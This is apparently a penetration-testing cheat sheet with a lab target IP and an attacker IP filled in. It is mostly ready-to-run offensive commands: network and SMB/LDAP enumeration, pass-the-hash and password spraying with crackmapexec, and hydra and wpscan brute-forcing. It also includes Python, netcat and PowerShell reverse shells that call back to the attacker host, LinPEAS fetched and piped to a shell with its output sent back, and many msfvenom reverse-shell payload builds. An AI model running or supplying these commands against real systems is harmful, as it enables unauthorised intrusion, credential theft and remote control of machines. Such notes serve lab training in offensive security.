---
Target IP: 192.168.119.145
Attacker IP: 192.168.45.246
---
#### nmap Command
```bash
ping -c 4 192.168.119.145
# Ping sweep scan
nmap -sn 192.168.119.145
# This will do the ping scan instead of ARP on port 80
nmap -sn -PS 192.168.119.145
# We can also specify the port or port range
nmap -sn -PS22 192.168.119.145
nmap -sn -PS1-1000 192.168.119.145

# Default port scan with version detection and default script findings
nmap -sCSV --min-rate=5000 -T4 192.168.119.145 -v -oN nmap-initial.log

## 1. All port scan | add -Pn if needed 
# -Pn: Skips host discovery; assumes the host is online.
nmap -p- --min-rate=5000 -T4 192.168.119.145 -v -oN nmap-all-ports.log
...
nmap -p$ports -sCSV 192.168.119.145 -v -oN nmap-services.log

# Best practice scan for UDP ports as well
sudo nmap -Pn -n 192.168.119.145 -sU --top-ports=100 --reason

sudo nmap -sU --top-ports 100 192.168.119.145

# SMB enum
sudo nmap -Pn -p139,445 -T4 --script "discovery and smb*" 192.168.119.145

# SNMP enum
sudo nmap -sU -p161 --script "*snmp*" 192.168.119.145
...
gobuster dir -u http://192.168.119.145 -w /usr/share/seclists/Discovery/Web-Content/common.txt -o gobuster-80.log -t 42 -b 400,404 --no-error

# Directory fuzzing dirlist - **raft medium** words/files
gobuster dir -u http://192.168.119.145 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -o gobuster-v2-80.log -t 42 -b 400,404 --no-error

# Directory fuzzing dirlist - big
gobuster dir -u http://192.168.119.145 -w /usr/share/seclists/Discovery/Web-Content/big.txt -o gobuster-80.log -t 42 -b 400,404 --no-error -x php,html,txt

# Directory fuzzing dirlist - dir 2.3 medium
gobuster dir -u http://192.168.119.145 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster-80.log -t 42 -b 400,404 --no-error -x php,html,txt

# Directory fuzzing dirlist - dir 2.3 small
gobuster dir -u http://192.168.119.145 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -o gobuster-80.log -t 42 -b 400,404 --no-error -x php,html,txt

# Directory fuzzing dirlist - **raft small** words/files
gobuster dir -u http://192.168.119.145 -w /usr/share/seclists/Discovery/Web-Content/raft-small-files.txt -o gobuster-v2-80.log -t 42 -b 400,404 --no-error

# Directory fuzzing dirlist - **raft large** words/files
gobuster dir -u http://192.168.119.145 -w /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt -o gobuster-v2-80.log -t 42 -b 400,404 --no-error -x php,html,txt

# Exclude length
gobuster dir -u http://192.168.119.145 -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt --exclude-length <LENGTH> -o gobuster-v2-80.log

# Subdomain fuzzing
gobuster vhost -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://192.168.119.145
```
...
curl -s http://192.168.119.145 | grep -i "api_key"
...
seq 1 100 | xargs -I {} -P 10 curl -X GET http://192.168.119.145
...
nmap --script=nfs-ls.nse,nfs-showmount.nse,nfs-statfs.nse -p 2049 192.168.119.145
```
#### DNS Enum
```bash
# DNS Zone transfer
dig @192.168.119.145 axfr <dns_name>

# dns enum
dnsenum 192.168.119.145
```
#### SMB Enum
```bash
nmap -script=smb-vuln\* -p445 192.168.119.145

enum4linux -a 192.168.119.145 
# Enumerate using login credentials:
enum4linux -u user_name -p password 192.168.119.145
# Enumerate user list:
enum4linux -U 192.168.119.145
  
smbclient -N -L //192.168.119.145//

smbclient -L 192.168.119.145 --option="client min protocol=core" -U ''

# Connect with a username:
smbclient //192.168.119.145/share -U username
# Connect with a workgroup:
smbclient //192.168.119.145/share --workgroup domain -U username
# Connect with a username and password:
smbclient //192.168.119.145/share -U username%password
  
crackmapexec smb 192.168.119.145 --shares
```
#### LinPEAS
```bash
# Output to file
python -m http.server 80 
curl 192.168.45.246/linpeas.sh -o linpeas.sh
wget http://192.168.45.246/linpeas.sh -O linpeas.sh
./linpeas.sh -a > linpeas.txt #Victim
less -r linpeas.txt #Read with colors

# Local network
sudo python3 -m http.server 80 #Host
curl 192.168.45.246/linpeas.sh | sh #Victim

# Without curl
sudo nc -q 5 -lvnp 80 < linpeas.sh #Host
cat < /dev/tcp/192.168.45.246/80 | sh #Victim

# Excute from memory and send output back to the host
nc -lvnp 9002 | tee linpeas.out #Host
curl 192.168.45.246:8000/linpeas.sh | sh | nc 192.168.45.246 9002 #Victim
```
#### Crackmapexec
```bash
# General help
...
# Null session
crackmapexec smb 192.168.119.145 -u "" up ""
# Connect to target using local account
crackmapexec smb 192.168.119.145 -u 'Administrator' -p 'PASSWORD' --local-auth
# Pass the hash against a subnet
crackmapexec smb 192.168.119.145 -u administrator -H 'LMHASH:NTHASH' --local-auth
crackmapexec smb 192.168.119.145 -u administrator -H 'NTHASH'
# Bruteforcing and Password Spraying
crackmapexec smb 192.168.119.145 -u "admin" -p "password1"
crackmapexec smb 192.168.119.145 -u "admin" -p "password1" "password2"
crackmapexec smb 192.168.119.145 -u "admin1" "admin2" -p "P@ssword"
crackmapexec smb 192.168.119.145 -u user_file.txt -p pass_file.txt
crackmapexec smb 192.168.119.145 -u user_file.txt -H ntlm_hashFile.txt
```
#### LDAP Enum
```bash
#If LDAP running some LDAP related `nmap` scripts to enumerate
nmap -n -sV --script "ldap* and not brute" 192.168.119.145

# we can run LDAP search with the naming context included to enumerate users and grep by SAM account name.
ldapsearch -x -H "ldap://192.168.119.145" -D '' -w '' -b "DC=hutch,DC=offsec" | grep sAMAccountName
...
ldapsearch -x -H "ldap://192.168.119.145" -D 'domain\username' -w 'password' -b 'dc=hutch,dc=offsec' "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd 
...
#### Rev Shell
```bash
python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.45.246\",445));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")"

msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.45.246 LPORT=4444 -f elf -o shell

msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.246 LPORT=4444 -f exe -o rev.exe

msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.246 LPORT=4444 -f exe-service -o rev-svc.exe
...
# nc revshell stealth
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.45.246 5554 >/tmp/f

# windows rev shell with powercat
powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.246/powercat.ps1');powercat -c 192.168.45.246 -p 4444 -e cmd"
...
```bash
# Top command 
dirsearch -u http://192.168.119.145 -e php,html -x 400,500 -r -t 8 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
...
dirsearch -u http://192.168.119.145 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x 403  
# Use a custom wordlist for directory and file brute-forcing: 
dirsearch -u http://192.168.119.145 -w /path/to/wordlist.txt 
# Specify file extensions to look for during the scan: 
dirsearch -u http://192.168.119.145 -e php,txt,html 
# Recursively scan subdirectories for directories and files:
dirsearch -u http://192.168.119.145 -r
# Save scan results to a file: 
dirsearch -u http://192.168.119.145 -o dirseacrh.txt 
# Specify custom HTTP headers for the requests: 
dirsearch -u http://192.168.119.145 -H "User-Agent: Mozilla/5.0"
```
#### hydra
```bash
# Basic command
hydra -l <username> -P /usr/share/wordlists/rockyou.txt <protocol>://192.168.119.145 -t 4

# For FTP
hydra -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt <protocol>://192.168.119.145 -t 4

# -t :: Number of thread followed by the number

# base64 encoded credentials and response as 403 forbidden
hydra -L usernames.txt -P passwords.txt 192.168.119.145 -s 8081 http-post-form '/service/rapture/session:username=^USER64^&password=^PASS64^:Forbidden'

# Post web login forms
hydra -l <username> -P /usr/share/wordlists/rockyou.txt 192.168.119.145 http-post-form "/login:username=^USER^&password=^PASS^:Your username or password is incorrect."

# Hydra basic authentication
hydra -l bob -P /usr/share/wordlists/rockyou.txt "http-get://192.168.119.145/protected:A=BASIC:F=401"
...
hydra -I -V -f -L usernames.txt -u -P /usr/share/seclists/Passwords/xato-net-10-million-passwords.txt 192.168.119.145 ftp
```
#### Netcat with rlwrap
```bash
...
scp ./PsExec64.exe USER@192.168.119.145:C:/Users/ariah/Downloads/psexec.exe
...
```powershell
# LFI and RFI
powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.246:8080/powercat.ps1');powercat -c 192.168.45.246 -p 4443 -e cmd"

### File transfer using SMB server
impacket-smbserver share_name share_path -smb2support

# Once setup download using in windows
copy \\192.168.45.246\share\ignite.txt

# To transfer the file from kali linux to the windows machine
scp test.txt user@192.168.119.145:/C:/Temp

# File transfer CMD
powershell iwr http://192.168.45.246/nc64.exe -outfile nc64.exe

# powershell file transfer
iwr -uri http://192.168.45.246/adduser.exe -Outfile adduser.exe

# execute netcat
.\nc64.exe 192.168.45.246 135 -e cmd.exe'

# printspoofer
PrintSpoofer.exe -i -c cmd

# if port 135 rpc (remote procedure call) is open then we can try below commands to interact with the process
rpcclient -U '' -N 192.168.119.145
...
rdesktop 192.168.119.145

# To download file in windows
certutil -urlcache -f http://192.168.45.246 path-output-file-name

# windows RDP from linux using xfreerdp
xfreerdp /v:192.168.45.246 /u:USER /p:PASSWORD /cert:ignore /dynamic-resolution

xfreerdp /cert:ignore /dynamic-resolution +clipboard /u:'user' /p:'password123!' /v:192.168.45.246
...
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.246 LPORT=LOCAL_PORT -f msi -o malicious.msi

msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.246 LPORT=4445 -f exe-service -o rev-svc.exe

msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.246 LPORT=4321 -b <bad characters> -a x86 -e x86/alpha_mixed --platform windows -f c

msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.246 LPORT=4444 -f dll -o rev.dll
...
msfvenom -p java/jsp_shell_reverse_tcp lhost=192.168.45.246 lport=4242 -f war > shell.war

# Windows Staged reverse TCP
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.45.246 LPORT=4242 -f exe > reverse.exe

# Windows Stageless reverse TCP
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.246 LPORT=4242 -f exe > reverse.exe

# Linux Staged reverse TCP
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.45.246 LPORT=4242 -f elf >reverse.elf

# Linux Stageless reverse TCP
msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.45.246 LPORT=4242 -f elf >reverse.elf
...
# Other platforms
$ msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.45.246 LPORT=4242 -f elf > shell.elf
$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.45.246 LPORT=4242 -f exe > shell.exe
$ msfvenom -p osx/x86/shell_reverse_tcp LHOST=192.168.45.246 LPORT=4242 -f macho > shell.macho
$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.45.246 LPORT=4242 -f asp > shell.asp
$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.45.246 LPORT=4242 -f raw > shell.jsp
$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.45.246 LPORT=4242 -f war > shell.war
$ msfvenom -p cmd/unix/reverse_python LHOST=192.168.45.246 LPORT=4242 -f raw > shell.py
$ msfvenom -p cmd/unix/reverse_bash LHOST=192.168.45.246 LPORT=4242 -f raw > shell.sh
$ msfvenom -p cmd/unix/reverse_perl LHOST=192.168.45.246 LPORT=4242 -f raw > shell.pl
$ msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.45.246 LPORT=4242 -f raw > shell.php; cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
...
./agent -connect 192.168.45.246:4443 -ignore-cert
...
smbmap -H 192.168.119.145

# For anonymous/guest access
smbmap -u 'guest' -p '' -H 192.168.119.145
...
smbmap -H 192.168.119.145 -u <username> -p <password>

# Scan with username and prompt for password
smbmap -H 192.168.119.145 -u <username>

# Scan with NTLM hash
smbmap -H 192.168.119.145 -u <username> -H <NTLM_hash>

# Scan with Kerberos ticket
smbmap -H 192.168.119.145 --kerberos
```
#### Crackmapexec
```bash
# SMB enumeration
crackmapexec smb 192.168.119.145 -u guest -p '' --shares

# To check the valid user and hashesh, we can use crackmapexec
crackmapexec winrm 192.168.119.145 -u <username file> -H <hash file>

```
#### Wpscan
```shell
# Enumerate WordPress version
wpscan --url http://192.168.119.145 --enumerate v
# Scan with API token
wpscan --url http://192.168.119.145 --api-token <your_api_token>
# HTTP basic authentication
wpscan --url http://192.168.119.145 --http-auth <username>:<password>
# Enumerate plugins, themes, and users

wpscan --url http://192.168.119.145 --enumerate ap,t,u --plugins-detection aggressive
...
wpscan --url http://192.168.119.145 --enumerate u --passwords <password_list>
# Brute force passwords for a specific user
wpscan --url http://192.168.119.145 -U <username> -P <password_list>
# Scan with a proxy
wpscan --url http://192.168.119.145 --proxy <proxy_ip:port>
# Scan for known vulnerabilities
wpscan --url http://192.168.119.145 --enumerate vp
# Enumerate plugins with vulnerability checks
wpscan --url http://192.168.119.145 --api-token YOUR_API_TOKEN --enumerate vp
# Brute force usernames
wpscan --url http://192.168.119.145 --enumerate u --passwords /path/to/passwords.txt
# Brute force password for a specific user
wpscan --url http://192.168.119.145 -U admin -P /path/to/passwords.txt
# Scan using an HTTP proxy
wpscan --url http://192.168.119.145 --proxy 127.0.0.1:8080
```
